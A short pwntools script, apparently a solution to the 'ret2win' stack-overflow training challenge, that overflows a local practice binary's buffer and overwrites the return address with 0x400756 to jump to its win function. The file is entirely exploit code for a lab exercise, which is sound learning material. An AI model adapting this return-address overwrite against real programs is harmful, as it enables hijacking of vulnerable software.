#!/usr/bin/python3

from pwn import *



io = process('./ret2win')


# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xcafebabe)*2

new_IP = p32(0x00400756) # 0xdeadbeef)*2

# Note: the return address was actuall only a 32 bit not 64 bit relitive return
ret2win = p64(0x0000000000400756)
payload = junk + new_bp +  new_IP

print("The payload is:")
print(payload)

input("Hit enter to apptempt exploit")



print(io.clean(0.5).decode("utf-8"))

io.send(junk+new_bp + new_IP)




input("exploit sent hit enter to end")

print(io.clean(0.5).decode("utf-8"))
sleep(1)
